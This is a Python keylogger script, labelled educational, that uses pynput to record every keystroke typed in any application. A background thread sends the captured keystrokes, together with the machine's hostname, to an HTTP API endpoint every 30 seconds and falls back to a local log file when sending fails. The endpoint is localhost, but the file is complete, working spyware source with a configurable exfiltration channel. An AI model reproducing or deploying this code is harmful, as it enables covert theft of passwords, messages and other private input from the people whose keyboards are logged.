"""
Keylogger with API data exfiltration
FOR EDUCATIONAL PURPOSES ONLY - LOCAL TESTING ONLY
"""

import os
import sys
import time
import json
import requests
import threading
from datetime import datetime
from typing import List

from pynput.keyboard import Key, Listener


API_URL = "http://localhost:5000/api/keystrokes"  

SEND_INTERVAL = 30  

LOCAL_LOG_FILE = "keylog_local.txt"


current_buffer = []
buffer_lock = threading.Lock()


last_send_time = time.time()

def send_to_api(data_buffer):
    """
    Send captured keystrokes to the API server
    """
    if not data_buffer:
        return False
    
    try:
        payload = {
            "timestamp": datetime.now().isoformat(),
            "hostname": os.uname().nodename,
            "keystrokes": "".join(data_buffer),
            "raw_data": data_buffer
        }
        
        response = requests.post(
            API_URL,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        
        if response.status_code == 200:
            print(f"✅ Sent {len(data_buffer)} keystrokes to API")
            return True
        else:
            print(f"❌ API returned error: {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("❌ Cannot connect to API server - saving locally only")
        return False
    except Exception as e:
        print(f"❌ Error sending to API: {e}")
        return False

def save_locally(data_buffer):
    """
    Save keystrokes to local file as backup
    """
    if not data_buffer:
        return
    
    try:
        with open(LOCAL_LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n--- [{timestamp}] ---\n")
            f.write("".join(data_buffer))
            f.write("\n")
        print(f"💾 Saved {len(data_buffer)} keystrokes to local file")
    except Exception as e:
        print(f"❌ Error saving locally: {e}")

def periodic_send():
    """
    Periodically send buffered keystrokes to API
    """
    global last_send_time, current_buffer
    
    while True:
        time.sleep(5)  
        
        current_time = time.time()
        if current_time - last_send_time >= SEND_INTERVAL:
            with buffer_lock:
                if current_buffer:
                    success = send_to_api(current_buffer)
                    
                    if success:
                        current_buffer = []
                    else:
                         save_locally(current_buffer)
                                          
                    last_send_time = current_time

def on_key_press(key):
    """
    Callback when key is pressed - just for display
    """
    try:
        if hasattr(key, 'char') and key.char:
            print(f"Key pressed: {key.char}")
        else:
            print(f"Special key: {key}")
    except Exception as e:
        print(f"Error: {e}")

def on_key_release(key):
    """
    Callback when key is released - capture keystrokes
    """
    global current_buffer
    
    if key == Key.esc:
        print("\n🛑 Escape pressed - stopping keylogger")
        return False
    
    with buffer_lock:
        try:
            if key == Key.enter:
                current_buffer.append('\n')
            elif key == Key.space:
                current_buffer.append(' ')
            elif key == Key.tab:
                current_buffer.append('\t')
            elif key == Key.backspace and current_buffer:
                
                current_buffer.pop()
            elif hasattr(key, 'char') and key.char is not None:
                current_buffer.append(key.char)
            elif hasattr(key, 'name'):
                
                current_buffer.append(f'[{key.name}]')
        except Exception as e:
            print(f"Error processing key: {e}")

def main():
    """
    Main function to start the keylogger
    """
    print("=" * 60)
    print("🔐 KEYLOGGER SIMULATION - FOR EDUCATIONAL USE ONLY")
    print("=" * 60)
    print(f"📤 API Endpoint: {API_URL}")
    print(f"💾 Local backup: {LOCAL_LOG_FILE}")
    print(f"⏱️  Send interval: {SEND_INTERVAL} seconds")
    print(f"🛑 Press ESC to stop logging")
    print("=" * 60)
    print("\n📝 Logging started... Type something in any application\n")
    
    sender_thread = threading.Thread(target=periodic_send, daemon=True)
    sender_thread.start()
    
    try:
        with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n\n🛑 Keylogger stopped by user")
    finally:
        with buffer_lock:
            if current_buffer:
                print("\n📤 Sending remaining keystrokes...")
                if not send_to_api(current_buffer):
                    save_locally(current_buffer)
        
        print("\n✅ Keylogger terminated")
        print(f"📁 Check local backup: {LOCAL_LOG_FILE}")

if __name__ == "__main__":
    main()

